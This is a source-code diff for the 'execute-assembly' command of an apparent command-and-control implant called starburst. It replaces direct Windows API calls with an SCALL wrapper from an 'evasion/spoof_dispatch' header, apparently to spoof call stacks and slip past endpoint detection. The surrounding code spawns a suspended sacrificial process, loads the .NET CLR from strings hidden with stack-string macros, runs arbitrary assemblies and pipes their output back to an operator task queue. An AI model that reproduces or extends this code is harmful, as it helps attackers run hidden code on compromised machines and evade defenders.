@@ -6,6 +6,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
 
@@ -122,8 +123,8 @@ static auto WINAPI declfn pipe_reader_fn( LPVOID param ) -> DWORD {
 
     while ( !ctx->done ) {
         available = 0;
-        if ( !inst.kernel32.PeekNamedPipe( ctx->h_pipe_read,
-                nullptr, 0, nullptr, &available, nullptr ) )
+        if ( !SCALL(inst, kernel32.PeekNamedPipe, ctx->h_pipe_read,
+                nullptr, 0, nullptr, &available, nullptr) )
             break;
 
         if ( available > 0 ) {
@@ -135,19 +136,19 @@ static auto WINAPI declfn pipe_reader_fn( LPVOID param ) -> DWORD {
                 ctx->output_cap = new_cap;
             }
             bytes_read = 0;
-            inst.kernel32.ReadFile( ctx->h_pipe_read,
+            SCALL(inst, kernel32.ReadFile, ctx->h_pipe_read,
                 ctx->output_buf + ctx->output_len,
-                available, &bytes_read, nullptr );
+                available, &bytes_read, nullptr);
             ctx->output_len += bytes_read;
         } else {
-            inst.kernel32.Sleep( 10 );
+            SCALL(inst, kernel32.Sleep, 10);
         }
     }
 
     while ( true ) {
         available = 0;
-        if ( !inst.kernel32.PeekNamedPipe( ctx->h_pipe_read,
-                nullptr, 0, nullptr, &available, nullptr ) )
+        if ( !SCALL(inst, kernel32.PeekNamedPipe, ctx->h_pipe_read,
+                nullptr, 0, nullptr, &available, nullptr) )
             break;
         if ( available == 0 ) break;
 
@@ -159,9 +160,9 @@ static auto WINAPI declfn pipe_reader_fn( LPVOID param ) -> DWORD {
             ctx->output_cap = new_cap;
         }
         bytes_read = 0;
-        inst.kernel32.ReadFile( ctx->h_pipe_read,
+        SCALL(inst, kernel32.ReadFile, ctx->h_pipe_read,
             ctx->output_buf + ctx->output_len,
-            available, &bytes_read, nullptr );
+            available, &bytes_read, nullptr);
         ctx->output_len += bytes_read;
     }
 
@@ -192,7 +193,7 @@ auto declfn starburst::cmd_execute_assembly(
     sa.bInheritHandle = TRUE;
 
     HANDLE h_read = nullptr, h_write = nullptr;
-    if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
+    if ( !SCALL( inst, kernel32.CreatePipe, &h_read, &h_write, &sa, 0 ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
         return;
@@ -201,7 +202,7 @@ auto declfn starburst::cmd_execute_assembly(
     // build command line for host process
     wchar_t cmdline[512] = { 0 };
     STK_RUNTIMEBROKER(_n1);
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, _n1, -1, cmdline, 512 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, _n1, -1, cmdline, 512 );
 
     STARTUPINFOW si = {};
     si.cb = sizeof( STARTUPINFOW );
@@ -211,15 +212,15 @@ auto declfn starburst::cmd_execute_assembly(
     si.hStdError = h_write;
 
     PROCESS_INFORMATION pi = {};
-    BOOL ok = inst.kernel32.CreateProcessW(
+    BOOL ok = (BOOL)SCALL( inst, kernel32.CreateProcessW,
         nullptr, cmdline, nullptr, nullptr, TRUE,
         CREATE_SUSPENDED | CREATE_NO_WINDOW,
         nullptr, nullptr, &si, &pi );
 
-    inst.kernel32.CloseHandle( h_write );
+    SCALL( inst, kernel32.CloseHandle, h_write );
 
     if ( !ok ) {
-        inst.kernel32.CloseHandle( h_read );
+        SCALL( inst, kernel32.CloseHandle, h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
         return;
@@ -240,10 +241,10 @@ auto declfn starburst::cmd_execute_assembly(
 
     // for simplicity, execute assembly in-process using CLR hosting
     // terminate the sacrificial process - we'll use local CLR instead
-    inst.kernel32.TerminateProcess( pi.hProcess, 0 );
-    inst.kernel32.CloseHandle( pi.hProcess );
-    inst.kernel32.CloseHandle( pi.hThread );
-    inst.kernel32.CloseHandle( h_read );
+    SCALL( inst, kernel32.TerminateProcess, pi.hProcess, 0 );
+    SCALL( inst, kernel32.CloseHandle, pi.hProcess );
+    SCALL( inst, kernel32.CloseHandle, pi.hThread );
+    SCALL( inst, kernel32.CloseHandle, h_read );
 
     auto pSetStdHandle = reinterpret_cast<fn_SetStdHandle>(
         resolve::_api(
@@ -254,7 +255,7 @@ auto declfn starburst::cmd_execute_assembly(
         SECURITY_ATTRIBUTES sa_pipe = {};
         sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
         sa_pipe.bInheritHandle = TRUE;
-        inst.kernel32.CreatePipe(
+        SCALL( inst, kernel32.CreatePipe,
             &inst.powerpick.pipe_read,
             &inst.powerpick.pipe_write, &sa_pipe, 0 );
         if ( pSetStdHandle ) {
@@ -269,7 +270,7 @@ auto declfn starburst::cmd_execute_assembly(
     sa_pipe.nLength = sizeof( SECURITY_ATTRIBUTES );
     sa_pipe.bInheritHandle = TRUE;
     HANDLE h_pipe_read = nullptr, h_pipe_write = nullptr;
-    inst.kernel32.CreatePipe( &h_pipe_read, &h_pipe_write, &sa_pipe, 0 );
+    SCALL( inst, kernel32.CreatePipe, &h_pipe_read, &h_pipe_write, &sa_pipe, 0 );
     if ( pSetStdHandle ) {
         pSetStdHandle( STD_OUTPUT_HANDLE, h_pipe_write );
         pSetStdHandle( STD_ERROR_HANDLE, h_pipe_write );
@@ -278,7 +279,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     // local CLR hosting approach
     STK_MSCOREE(_n2);
-    auto h_mscoree = inst.kernel32.LoadLibraryA( _n2 );
+    auto h_mscoree = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n2 );
     if ( !h_mscoree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "mscoree.dll load failed" ) ) );
@@ -391,7 +392,7 @@ auto declfn starburst::cmd_execute_assembly(
 
     // Load oleaut32 for SAFEARRAY + BSTR
     STK_OLEAUT32(_n3);
-    auto h_oleaut32 = inst.kernel32.LoadLibraryA( _n3 );
+    auto h_oleaut32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n3 );
     if ( !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "oleaut32 load failed" ) ) );
@@ -497,7 +498,7 @@ auto declfn starburst::cmd_execute_assembly(
                 uint32_t wlen = i - start + 1;
                 auto wbuf = static_cast<wchar_t*>( inst.heap_alloc( wlen * sizeof( wchar_t ) ) );
                 memory::zero( wbuf, wlen * sizeof( wchar_t ) );
-                inst.kernel32.MultiByteToWideChar( CP_ACP, 0, args_str + start, i - start, wbuf, wlen - 1 );
+                SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, args_str + start, i - start, wbuf, wlen - 1 );
                 BSTR bstr = pSysAllocString( wbuf );
                 inst.heap_free( wbuf );
                 pSafeArrayPutElement( sa_string_args, &idx, bstr );
@@ -532,7 +533,7 @@ auto declfn starburst::cmd_execute_assembly(
     reader_ctx.h_pipe_read = h_pipe_read;
     reader_ctx.done        = 0;
 
-    HANDLE h_reader = inst.kernel32.CreateThread(
+    HANDLE h_reader = (HANDLE)SCALL( inst, kernel32.CreateThread,
         nullptr, 0,
         reinterpret_cast<LPTHREAD_START_ROUTINE>( pipe_reader_fn ),
         &reader_ctx, 0, nullptr );
@@ -550,16 +551,16 @@ auto declfn starburst::cmd_execute_assembly(
 
     reader_ctx.done = 1;
     if ( h_reader ) {
-        inst.kernel32.WaitForSingleObject( h_reader, 5000 );
-        inst.kernel32.CloseHandle( h_reader );
+        SCALL( inst, kernel32.WaitForSingleObject, h_reader, 5000 );
+        SCALL( inst, kernel32.CloseHandle, h_reader );
     }
 
     uint8_t* output_buf = reader_ctx.output_buf;
     uint32_t output_len = reader_ctx.output_len;
 
 #ifndef INCLUDE_CMD_POWERPICK
-    inst.kernel32.CloseHandle( h_pipe_write );
-    inst.kernel32.CloseHandle( h_pipe_read );
+    SCALL( inst, kernel32.CloseHandle, h_pipe_write );
+    SCALL( inst, kernel32.CloseHandle, h_pipe_read );
 #endif
 
     pSafeArrayDestroy( sa_params_invoke );
